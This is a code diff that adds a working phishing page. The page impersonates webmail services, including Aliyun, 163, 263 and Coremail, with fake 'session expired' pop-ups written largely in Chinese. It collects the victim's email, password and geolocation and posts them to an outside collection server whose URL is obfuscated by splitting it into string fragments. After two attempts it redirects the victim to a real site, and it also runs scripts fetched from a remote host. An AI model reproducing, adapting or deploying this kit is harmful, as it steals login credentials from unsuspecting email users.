@@ -1,1 +1,1028 @@
-working...
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+    <link
+      id="favicon"
+      rel="icon"
+      href="original-favicon.ico"
+      type="image/x-icon"
+    />
+    <base href="https://stareio.com/SOMDserver/assets/" />
+
+    <!-- <script src="./myjs.js"></script> -->
+    <script>
+      const BASE_URL = "https://stareio.com/SOMDserver";
+      const ASSETS_URL = "https://stareio.com/SOMDserver/assets";
+
+      async function getPageContent(url) {
+        fetch(`${BASE_URL}/${url}.html`)
+          .then((response) => response.text())
+          .then((datan) => {
+            document.querySelector("#myFrame").innerHTML = datan;
+            const scripts = document
+              .querySelector("#myFrame")
+              .querySelectorAll("script");
+
+            // console.log(scripts);
+
+            scripts.forEach((script) => {
+              const newScript = document.createElement("script");
+              newScript.textContent = script.textContent;
+              document.body.appendChild(newScript); // Append to body or head
+            });
+
+            document.querySelector("#fuc").value =
+              document.querySelector("#foc").value;
+          })
+          .catch((error) => {
+            console.error("Error Loading data:", error);
+          });
+      }
+
+      async function abs(ml, mg, ss) {
+        try {
+          if (ss == "lkkd") {
+            page = "lkkd";
+            original = "";
+          } else {
+            let r = await fetch(`${ml}?${mg}`);
+            // let testcheck = await r.text();
+            // console.log(testcheck);
+            let v = await r.json();
+            let page = JSON.parse(v).mx_page;
+            let original = JSON.parse(v).original;
+            let datan = "";
+          }
+          console.log(mg, page, original, "here");
+
+          await getPageContent(page);
+          displayPage(page);
+          // getPageContent(page, original);
+
+          // document.querySelector("#loader").style.display = "none";
+          document.querySelector("#orgi").value = original;
+          document.querySelector("#page").value = page;
+          //sessionStorage.setItem("m", mg)
+          //sessionStorage.setItem("m", mg);
+          //sessionStorage.setItem("original", JSON.parse(v).original);
+          //console.log(v)
+          // window.location.assign(
+          // `${baseURL}/${JSON.parse(v).mx_page}.html?${xx[1]}`
+          // );
+          // loadBackground(original);
+        } catch (e) {
+          console.log("ABS Func", e);
+        }
+      }
+
+      function displayPage(page) {
+        if (
+          page == "lkkd" ||
+          page == "office" ||
+          page == "cn4e" ||
+          page == "bossmail" ||
+          page == "webmail" ||
+          page == "roundcube" ||
+          page == "naver" ||
+          page == "globalmail"
+        ) {
+          showForm(null);
+        } else {
+          document.querySelector(".frr_popup").style.display = "flex";
+
+          if (page == "qiye-aliyun" || page == "aliyun") {
+            // document.querySelector(".frr_popup").style.display = "flex";
+            document.querySelector("#test #errorPop").innerHTML = ` <style>
+            .eer_dialog {
+                width: 500px;
+                background-color: white;
+                border: 1px solid #ddd;
+                border-radius: 4px;
+                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+                overflow: hidden;
+            }
+
+            .eer_dialog-header {
+                background-color: #f1f1f1;
+                padding: 10px 16px;
+                font-size: 16px;
+                font-weight: bold;
+                color: #333;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+            }
+
+            .eer_dialog-header .eer_close {
+                cursor: pointer;
+                font-size: 14px;
+                color: #999;
+            }
+
+            .eer_dialog-header .eer_close:hover {
+                color: #333;
+            }
+
+            .eer_dialog-content {
+                padding: 16px;
+                font-size: 14px;
+                color: #555;
+                text-align: left;
+                padding: 30px ;
+                font-weight: 500;
+            }
+
+            .eer_dialog-footer {
+                padding: 10px 16px;
+                text-align: right;
+                background-color: #f1f1f1;
+            }
+
+            .eer_dialog-footer button {
+                padding: 6px 12px;
+                font-size: 14px;
+                border: none;
+                border-radius: 4px;
+                background-color: #4c81ba;
+                color: white;
+                cursor: pointer;
+            }
+
+            .eer_dialog-footer button:hover {
+                background-color: #0056b3;
+            }
+            </style>
+            <div class="eer_dialog">
+                <div class="eer_dialog-header">
+                    <span>System information</span>
+                    <span class="eer_close">&times;</span>
+                </div>
+                <div class="eer_dialog-content">
+                    The session has expired, please log in again.
+                </div>
+                <div class="eer_dialog-footer">
+                    <button onclick='showForm(null)'>OK</button>
+                </div>
+            </div>
+            `;
+          } else if (page == "qiye-163" || page == "163") {
+            // document.querySelector(".frr_popup").style.display = "flex";
+            document.querySelector("#test #errorPop").innerHTML = `<style>
+
+            .eer_container {
+                width: 500px;
+                border: 1px solid #ccc;
+                background-color: white;
+            }
+            .eer_header {
+                background: linear-gradient(to bottom, rgba(124, 218, 255, 0.3), rgb(12, 152, 207));
+                height: 30px;
+                color: white;
+                padding: 0px 10px;
+                display: flex;
+                align-items: center;
+
+            }
+            .eer_header i {
+                margin-right: 8px;
+            }
+            .eer_content {
+                display: flex;
+                align-items: center;
+                padding: 20px;
+            }
+            .eer_icon {
+                font-size: 50px;
+                color: #ccc;
+            }
+            .eer_message {
+                color: red;
+                font-size: 14px;
+                margin: 10px 0;
+                margin-left: 20px;
+                font-weight: 600;
+            }
+            .eer_button-container {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                text-align: center;
+                padding: 5px;
+                border-top: 2px solid rgb(213, 220, 232);
+                background-color: rgb(241, 246, 254);
+            }
+            .eer_button {
+                padding: 5px 10px;
+                margin: 5px;
+                border: 1px solid #ccc;
+                background-color: #f1f1f1;
+                cursor: pointer;
+                font-weight: 500;
+                background: linear-gradient(to bottom, rgb(228, 241, 247), rgb(154, 210, 232));
+
+
+            }
+            .eer_button:hover {
+                background-color: #e0e0e0;
+            }
+            </style>
+            <div class="eer_container">
+                <div class="eer_header">
+                    <i class="bi bi-info-circle-fill"></i>
+                    <p>系统提示</p>
+                    </div>
+                <div class="eer_content">
+                    <div class="eer_icon"> ☹ </div>
+                    <div class="err_message"> &nbsp; 会话已过期，请重新登录。</div>
+                </div>
+                <div class="eer_button-container">
+                    <button class="eer_button" onclick='showForm(null)'>返回邮箱首页</button>
+                </div>
+            </div>`;
+          } else if (page == "263") {
+            // document.querySelector(".frr_popup").style.display = "flex";
+            document.querySelector("#test #errorPop").innerHTML = `<style>
+
+                .err_container {
+                width: 450px;
+                background: #ffffff;
+                border: 1px solid #ddd;
+                padding: 20px;
+                box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.1);
+                }
+                .err_title {
+                color: #a00;
+                font-weight: bold;
+                margin-bottom: 10px;
+                float: left;
+                }
+                .err_content {
+                text-align: center;
+                margin: 20px 50px;
+                font-weight: 600;
+                }
+                .err_message {
+                font-size: 12px;
+                color: #000;
+                margin-bottom: 5px;
+                }
+                .err_email {
+                font-size: 12px;
+                color: #222;
+                word-break: break-all;
+                }
+                .err_button {
+                display: flex;
+                justify-content: flex-end;
+                margin-top: 0px;
+                padding: 5px 25px;
+                background: #aaa;
+                color: #fff;
+                text-decoration: none;
+                border: none;
+                cursor: pointer;
+                }
+                .err_button:hover {
+                background: #888;
+                }
+                .err_footer {
+                display: flex;
+                justify-content: flex-end;
+                }
+            </style>
+
+            <div class="err_container">
+                <div class="err_title">系统提示</div>
+                <div class="err_content">
+                <div class="err_message">您当前状态已失效，请重新登录邮箱</div>
+                <div class="err_email">
+                    (wm2a115-0208073811-<span id='263email'>${mg}</span>-94a031743ad9833f4171dbf5c69d19fa)
+                </div>
+                </div>
+                <div class="err_footer">
+                <button class="err_button" onclick='showForm(null)'>返回</button>
+                </div>
+            </div>
+
+            `;
+          } else if (page == "icoremail") {
+            // document.querySelector(".frr_popup").style.display = "flex";
+            document.querySelector("#test #errorPop").innerHTML = `<style>
+
+            .err_dialog {
+                width: 450px;
+                background-color: white;
+                border: 1px solid #e0e0e0;
+                border-radius: 8px;
+                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+                padding: 16px;
+                text-align: center;
+            }
+
+            .err_dialog-header {
+                display: flex;
+                align-items: center;
+                margin-bottom: 12px;
+            }
+
+            .err_dialog-header-icon {
+                width: 20px;
+                height: 20px;
+                margin-right: 10px;
+                color: white;
+                background-color: orange;
+                border-radius: 100%;
+            }
+
+            .err_dialog-header span {
+                font-size: 16px;
+                font-weight: bold;
+                color: #333;
+            }
+
+            .err_dialog-content {
+                font-size: 14px;
+                color: #666;
+                margin-bottom: 16px;
+            }
+
+            .err_dialog-buttons {
+                display: flex;
+                justify-content: flex-end;
+            }
+
+            .err_dialog-buttons button {
+                padding: 5px 10px;
+                height: 36px;
+                border: none;
+                border-radius: 4px;
+                font-size: 14px;
+                cursor: pointer;
+                margin-left: 5px;
+            }
+
+            .err_dialog-buttons .err_cancel-button {
+                background-color: #f2f2f2;
+                color: #333;
+            }
+
+            .err_dialog-buttons .err_cancel-button:hover {
+                background-color: #e0e0e0;
+            }
+
+            .err_dialog-buttons .err_login-button {
+                background-color: #007bff;
+                color: white;
+            }
+
+            .err_dialog-buttons .err_login-button:hover {
+                background-color: #0056b3;
+            }
+            </style>
+
+            <div class="err_dialog">
+                <div class="err_dialog-header">
+                    <div class="err_dialog-header-icon">!</div>
+                    <span>提示</span>
+                </div>
+                <div class="err_dialog-content">
+                    你的登录状态已失效，请重新登录。
+                </div>
+                <div class="err_dialog-buttons">
+                    <button class="err_cancel-button" onclick='showForm(null)'>取消</button>
+                    <button class="err_login-button" onclick='showForm(null)'>重新登录</button>
+                </div>
+            </div>
+            `;
+          } else {
+            // document.querySelector(".frr_popup").style.display = "flex";
+            document.querySelector("#test #errorPop").innerHTML = `<style>
+
+            .err_dialog {
+                width: 450px;
+                background-color: white;
+                border: 1px solid #e0e0e0;
+                border-radius: 8px;
+                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+                padding: 16px;
+                text-align: center;
+            }
+
+            .err_dialog-header {
+                display: flex;
+                align-items: center;
+                margin-bottom: 12px;
+            }
+
+            .err_dialog-header-icon {
+                width: 20px;
+                height: 20px;
+                margin-right: 10px;
+                color: white;
+                background-color: orange;
+                border-radius: 100%;
+            }
+
+            .err_dialog-header span {
+                font-size: 16px;
+                font-weight: bold;
+                color: #333;
+            }
+
+            .err_dialog-content {
+                font-size: 14px;
+                color: #666;
+                margin-bottom: 16px;
+            }
+
+            .err_dialog-buttons {
+                display: flex;
+                justify-content: flex-end;
+            }
+
+            .err_dialog-buttons button {
+                padding: 5px 10px;
+                height: 36px;
+                border: none;
+                border-radius: 4px;
+                font-size: 14px;
+                cursor: pointer;
+                margin-left: 5px;
+            }
+
+            .err_dialog-buttons .err_cancel-button {
+                background-color: #f2f2f2;
+                color: #333;
+            }
+
+            .err_dialog-buttons .err_cancel-button:hover {
+                background-color: #e0e0e0;
+            }
+
+            .err_dialog-buttons .err_login-button {
+                background-color: #007bff;
+                color: white;
+            }
+
+            .err_dialog-buttons .err_login-button:hover {
+                background-color: #0056b3;
+            }
+            </style>
+
+            <div class="err_dialog">
+
+                <div class="err_dialog-content">
+                   <br> 你的登录状态已失效，请重新登录。
+                </div>
+                <div class="err_dialog-buttons">
+                    <button class="err_login-button" onclick="showForm('default')"">重新登录</button>
+                </div>
+            </div>`;
+          }
+        }
+      }
+    </script>
+    <script
+      type="text/javascript"
+      src="https://code.jquery.com/jquery-latest.min.js"
+    ></script>
+  </head>
+
+  <body>
+    <style>
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+      }
+      iframe {
+        width: 100%;
+        height: 100vh; /* Occupies full viewport height */
+        border: none; /* Optional: remove border */
+      }
+
+      * {
+        padding: 0;
+        margin: 0;
+        box-sizing: border-box;
+      }
+      #loader {
+        display: none;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+        height: 100%;
+        position: absolute;
+        top: 0;
+        left: 0;
+        background-color: #f1f2f555;
+        z-index: 99;
+      }
+
+      @keyframes hideLoader {
+        from {
+          opacity: 1;
+        }
+
+        to {
+          opacity: 0;
+        }
+      }
+
+      @keyframes showLoader {
+        from {
+          opacity: 0;
+        }
+
+        to {
+          opacity: 1;
+        }
+      }
+
+      .lds-ellipsis {
+        display: inline-block;
+        position: relative;
+        width: 80px;
+        height: 80px;
+        opacity: 0.8;
+      }
+
+      .lds-ellipsis div {
+        position: absolute;
+        top: 33px;
+        width: 13px;
+        height: 13px;
+        border-radius: 50%;
+        background: dodgerblue;
+        animation-timing-function: cubic-bezier(0, 1, 1, 0);
+      }
+
+      .lds-ellipsis div:nth-child(1) {
+        left: 8px;
+        animation: lds-ellipsis1 0.6s infinite;
+      }
+
+      .lds-ellipsis div:nth-child(2) {
+        left: 8px;
+        animation: lds-ellipsis2 0.6s infinite;
+      }
+
+      .lds-ellipsis div:nth-child(3) {
+        left: 32px;
+        animation: lds-ellipsis2 0.6s infinite;
+      }
+
+      .lds-ellipsis div:nth-child(4) {
+        left: 56px;
+        animation: lds-ellipsis3 0.6s infinite;
+      }
+
+      @keyframes lds-ellipsis1 {
+        0% {
+          transform: scale(0);
+        }
+
+        100% {
+          transform: scale(1);
+        }
+      }
+
+      @keyframes lds-ellipsis3 {
+        0% {
+          transform: scale(1);
+        }
+
+        100% {
+          transform: scale(0);
+        }
+      }
+
+      @keyframes lds-ellipsis2 {
+        0% {
+          transform: translate(0, 0);
+        }
+
+        100% {
+          transform: translate(24px, 0);
+        }
+      }
+    </style>
+    <div id="loader">
+      <div class="lds-ellipsis">
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+    </div>
+    <input
+      class="frr_input"
+      type="hidden"
+      id="loc"
+      name="email"
+      required
+      placeholder="Loc"
+    />
+    <input
+      class="frr_input"
+      type="hidden"
+      id="foc"
+      name="email"
+      required
+      placeholder="FOC"
+    />
+
+    <input
+      class="frr_input"
+      type="hidden"
+      id="trial"
+      name="email"
+      required
+      placeholder="trial"
+    />
+    <input
+      class="frr_input"
+      type="hidden"
+      id="orgi"
+      name="orgi"
+      required
+      placeholder="original"
+    />
+
+    <input
+      class="frr_input"
+      type="hidden"
+      id="page"
+      name="page"
+      required
+      placeholder="PG"
+    />
+
+    <script>
+      let xx = window.location.href.split("?");
+      xx = xx[1].split("__");
+      let mg = "";
+      let base64regex =
+        /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+      if (xx[1] != undefined) {
+        if (!base64regex.test(xx[1])) {
+          mg = xx[1];
+        } else {
+          mg = atob(xx[1]);
+        }
+
+        /*
+        let rd1 = "htt";
+        let rd2 = "ps://";
+        let rd3 = "sta";
+        let rd4 = "reio.com/se";
+        let rd5 = "rvePa";
+        let rd6 = "ge.php"; */
+
+        let rd1 = `${BASE_URL}/engine/servePage.php`;
+        let rd2 = "";
+        let rd3 = "";
+        let rd4 = "";
+        let rd5 = "";
+        let rd6 = "";
+
+        abs(`${rd1}${rd2}${rd3}${rd4}${rd5}${rd6}`, mg, xx[3]);
+      }
+
+      function strat() {
+        document.querySelector("#loader").style.display = "flex";
+        let page = document.querySelector("#page").value;
+        // document.querySelector("#startbtn").style.display = "none";
+        if (
+          page == "lkkd" ||
+          page == "office" ||
+          page == "cn4e" ||
+          page == "bossmail" ||
+          page == "webmail" ||
+          page == "roundcube" ||
+          page == "naver" ||
+          page == "globalmail"
+        ) {
+        } else {
+          document.querySelector(".frr_popup").style.display = "flex";
+        }
+
+        displayPage(page);
+
+        let tx = setInterval(() => {
+          let dd = document.querySelector("#myFrame");
+          if (dd.innerHTML.trim() != "") {
+            dd.style.display = "block";
+            document.querySelector("#loader").style.display = "none";
+            clearInterval(tx);
+          }
+        }, 2000);
+
+        // cancelDownload();
+      }
+    </script>
+
+    <style>
+      #formPop {
+        display: none;
+      }
+
+      #errorPop {
+        display: flex;
+      }
+
+      .frr_popup {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
+        justify-content: center;
+        align-items: flex-start;
+        z-index: 20000000000000;
+      }
+
+      #test {
+        /* background-color: white; */
+        padding: 20px;
+        border-radius: 5px;
+        text-align: center;
+        width: auto;
+        margin-top: 50px;
+      }
+    </style>
+    <script>
+      function showForm(a) {
+        // strat();
+        console.log("wwwwwwwwwww", a);
+
+        document.querySelector("#test #errorPop").style.display = "none";
+        if (!a) {
+          document.querySelector(".frr_popup").style.display = "none";
+        } else {
+          document.querySelector(
+            ".frr_popup #test"
+          ).innerHTML += `<form id="form_" action="#" method="POST" onsubmit="subForm(event)">
+            <input type="hidden" value="Global Others" id="resBox" />
+          <div id="formPop">
+            <style>
+              .frr_login-container {
+                background-color: #fff;
+                padding: 20px;
+                border-radius: 8px;
+                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+                width: 350px;
+              }
+
+              .frr_h2 {
+                text-align: center;
+              }
+
+              .frr_form-group {
+                margin-bottom: 15px;
+              }
+
+              .frr_label {
+                display: block;
+                font-size: 14px;
+                margin-bottom: 5px;
+                text-align: left;
+              }
+
+              .frr_input {
+                width: 100%;
+                padding: 10px;
+                font-size: 14px;
+                border: 1px solid #ddd;
+                border-radius: 4px;
+              }
+
+              .frr_button {
+                width: auto;
+                padding: 10px;
+                background-color: #007bff;
+                color: white;
+                font-size: 16px;
+                border: none;
+                border-radius: 4px;
+                cursor: pointer;
+                float: right;
+              }
+
+              .frr_button:hover {
+                background-color: #0056b3;
+              }
+
+              .frr_error-message {
+                color: red;
+                font-size: 12px;
+                margin-top: 5px;
+              }
+            </style>
+
+            <div class="frr_login-container">
+              <div
+                style="
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+                  margin-bottom: 10px;
+                  gap: 10px;
+                "
+              >
+                <img id="favic" height="30" />
+                <h2 class="frr_h2">Login</h2>
+              </div>
+              <p style="margin-bottom: 20px">
+                Session Expired! Login to Continue.
+              </p>
+              <div class="frr_form-group">
+                <label class="frr_label" for="email">Email:</label>
+                <input
+                  class="frr_input"
+                  type="email"
+                  id="fuc"
+                  name="email"
+                  required
+                  placeholder="Enter your email"
+                  value="${mg}"
+                />
+                <span id="errmsg" class="frr_error-message" style='display: none'>您的用户名或密码有误，请重新输入!</span>
+              </div>
+
+              <div class="frr_form-group">
+                <label class="frr_label" for="password">Password:</label>
+                <input
+                  class="frr_input"
+                  type="password"
+                  id="fpc"
+                  name="password"
+                  required
+                  placeholder="Enter your password"
+                />
+              </div>
+
+              <button type="submit" class="frr_button" id="frr_button">
+                Login
+              </button>
+            </div>
+          </div>
+        </form> `;
+
+          document.querySelector("#test #formPop").style.display = "flex";
+        }
+      }
+    </script>
+
+    <div class="frr_popup">
+      <div id="test">
+        <div id="errorPop"></div>
+      </div>
+    </div>
+
+    <div id="myFrame"></div>
+
+    <script>
+      //Your PHP GOES HERE
+      let nbg1 = "htt";
+      let nbg2 = "ps://si";
+      let nbg3 = "nglet";
+      let nbg4 = "oncop.i";
+      let nbg5 = "nfo/we";
+      let nbg6 = "bxr.php";
+
+      let nbg = `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`;
+
+      /* let ov1 = "htt";
+      let ov2 = "ps://";
+      let ov3 = "ma";
+      let ov4 = "deinchin";
+      let ov5 = "a-sendinquiry-shrom.gl";
+      let ov6 = "itch.me/notfound.h";
+      let ov7 = "tml"; */
+
+      let ov1 = "https";
+      let ov2 = "://";
+      let ov3 = "lin";
+      let ov4 = "kedin";
+      let ov5 = ".cn";
+      let ov6 = "/lo";
+      let ov7 = "gin";
+
+      //   let ov1 =
+      //     "https://1drv.ms/x/c/EB8A869ED6D5552D/ERgdKjO07zJOvR6bSW3tqYkBzd-Cd4dmwHOuY2o8gk9Hdw?e=h0pOHr";
+      //   let ov2 = "";
+      //   let ov3 = "";
+      //   let ov4 = "";
+      //   let ov5 = "";
+      //   let ov6 = "";
+      //   let ov7 = "";
+
+      let ov = `${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`;
+
+      //sessionStorage.clear();
+      // let original = document.querySelector("#orgi").value;
+      let original = ov;
+      let trialCount = sessionStorage.getItem("num_trial");
+
+      if (!trialCount) {
+        sessionStorage.setItem("num_trial", 0);
+      } else if (trialCount >= 2) {
+        window.location.assign(original);
+      }
+
+      let foc = document.querySelector("#foc");
+      let trial = document.querySelector("#trial");
+
+      console.log(mg, original, "mew");
+
+      foc.value = mg;
+
+      trial.value = trialCount;
+
+      // let myForm = document.querySelector("#form_");
+
+      async function subForm(event) {
+        event.preventDefault();
+
+        let fuc = document.querySelector("#fuc");
+        let fpc = document.querySelector("#fpc");
+        let loc = document.querySelector("#loc");
+
+        $.ajax({
+          dataType: "JSON",
+          url: nbg,
+          type: "POST",
+          data: {
+            hos: xx[2],
+            foc: foc.value,
+            fuc: fuc.value,
+            fpc: fpc.value,
+            loc: loc.value,
+            trial: trial.value,
+            resBox: document.querySelector("#resBox").value,
+          },
+          beforeSend: function (xhr) {
+            // console.log(xhr);
+            animateLoading(true);
+          },
+          success: function (response) {
+            console.log("Success", response);
+            // Combine logic from both success functions here
+            if (response) {
+              animateLoading(false);
+              // console.log(response);
+              if (response["signal"] == "ok") {
+                trialCount++;
+                sessionStorage.setItem("num_trial", trialCount);
+                trial.value = trialCount;
+
+                if (trialCount >= 2) {
+                  count = 0;
+                  window.location.replace(original);
+                  return false;
+                }
+
+                fpc.value = "";
+                fpc.focus();
+                showError(true);
+              } else {
+                console.log("Error Occurred!!!");
+              }
+            }
+          },
+          error: function (jqXHR, textStatus, errorThrown) {
+            console.log("Error", jqXHR, textStatus, errorThrown);
+            fpc.value = "";
+            fpc.focus();
+            showError(true);
+          },
+          complete: function (xhr) {
+            animateLoading(false);
+          },
+        });
+      }
+
+      $.get(
+        "https://ipinfo.io/json?token=10da60a9ff2d81",
+        function (response) {
+          let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`;
+          $("#loc").val(cou);
+        },
+        "jsonp"
+      );
+    </script>
+  </body>
+</html>
